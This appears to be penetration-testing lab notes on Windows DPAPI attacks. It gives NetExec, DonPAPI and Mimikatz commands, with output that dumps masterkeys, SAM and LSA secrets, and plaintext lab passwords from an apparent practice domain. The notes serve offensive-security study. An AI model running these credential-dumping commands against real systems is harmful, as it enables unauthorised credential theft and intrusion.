**DPAPI Attacks** are a method used in Windows environments where an attacker targets encrypted data. It works by exploiting the Data Protection API (DPAPI) to decrypt sensitive information, such as stored passwords or encryption keys, by obtaining the necessary credentials or keys to access the protected data.

### Netexec

```bash
nxc smb 192.168.56.11 -u ROBB.STARK -p sexywolfy --dpapi
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\ROBB.STARK:sexywolfy (Pwn3d!)
SMB         192.168.56.11   445    WINTERFELL       [*] Collecting User and Machine masterkeys, grab a coffee and be patient...
SMB         192.168.56.11   445    WINTERFELL       [+] Got 8 decrypted masterkeys. Looting secrets...
SMB         192.168.56.11   445    WINTERFELL       [robb.stark][CREDENTIAL] Domain:target=TERMSRV/castelblack - north\robb.stark:sexywolfy
SMB         192.168.56.11   445    WINTERFELL       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{06107D65-E548-48FB-994D-3096AC86E0EE} - NORTH\eddard.stark:FightP3aceAndHonor!
SMB         192.168.56.11   445    WINTERFELL       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{FED5EDBF-FF03-43F5-9BBE-E4E8F6B18684} - NORTH\robb.stark:sexywolfy
```

### Donpapi

```bash
donpapi collect -d north -u ROBB.STARK -p sexywolfy -t 192.168.56.11
[💀] [+] First time use detected. Creating home directory
[💀] [+] DonPAPI Version 2.0.1
[💀] [+] Output directory at /home/garffff/.donpapi
[💀] [+] Loaded 1 targets
[💀] [+] Recover file available at /home/garffff/.donpapi/recover/recover_1723803529
[192.168.56.11] [+] Starting gathering credz
[192.168.56.11] [+] Dumping SAM
[11:18:49] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                                                                           secretsdump.py:1340
[192.168.56.11] [$] [SAM] Got 3 accounts
[192.168.56.11] [+] Dumping LSA
[192.168.56.11] [$] [LSA] (Unknown User):sexywolfy
[192.168.56.11] [+] Dumping User and Machine masterkeys
[192.168.56.11] [$] [DPAPI] Got 8 masterkeys
[192.168.56.11] [+] Dumping User Chromium Browsers
[192.168.56.11] [+] Dumping User and Machine Certificates
[192.168.56.11] [$] [Certificates] [SYSTEM] - VAGRANT - VAGRANT_179DDAC42F086D3C.pfx
[192.168.56.11] [$] [Certificates] [SYSTEM] - winterfell.north.sevenkingdoms.local - winterfell.north.sevenkingdoms.local_6A95EDD4DA2C6B83.pfx - Client auth possible
[192.168.56.11] [+] Dumping User and Machine Credential Manager
[192.168.56.11] [$] [CredMan] [robb.stark] Domain:target=TERMSRV/castelblack - north\robb.stark:sexywolfy
[192.168.56.11] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{06107D65-E548-48FB-994D-3096AC86E0EE} - NORTH\eddard.stark:FightP3aceAndHonor!
[192.168.56.11] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{FED5EDBF-FF03-43F5-9BBE-E4E8F6B18684} - NORTH\robb.stark:sexywolfy
[192.168.56.11] [+] Gathering recent files and desktop files
[192.168.56.11] [+] Dumping User Firefox Browser
[192.168.56.11] [+] Dumping MobaXterm credentials
[192.168.56.11] [+] Dumping MRemoteNg Passwords
[192.168.56.11] [+] Dumping User's RDCManager
[192.168.56.11] [+] Dumping SCCM Credentials
[192.168.56.11] [+] Dumping User and Machine Vaults
[192.168.56.11] [+] Dumping VNC Credentials
[192.168.56.11] [+] Dumping Wifi profiles
DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### MimiKatz

WinPeas:

Encrypted files:

![file:///tmp/.QWTCY2/1.png](file:///tmp/.QWTCY2/1.png)

File location:

```bash
C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6
C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
```

### Extract the Master key:

```bash
Get-ChildItem -Force C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
```

![[Pasted image 20241207184754.png]]


First location:

```bash
Invoke-Mimikatz -command '"dpapi::cred /in:C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"'

mimikatz(powershell) # dpapi::cred /in:C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {99cf41a3-a552-4cf7-a8d7-aca2d6f7339b}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data
```

Master Key: `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`

Second location:

```bash
Invoke-Mimikatz -command '"dpapi::cred /in:C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"'

mimikatz(powershell) # dpapi::cred /in:C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {99cf41a3-a552-4cf7-a8d7-aca2d6f7339b}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 586c18f719809aa13da9974b6a8c37c0
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : c03adc671023481d60b1c89b10984e51
  dwDataLen          : 00002a48 - 10824
  pbData             : 9da1476ab9fd16f8200b3f717480c606f<-SNIP->
```

Master Key: `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`




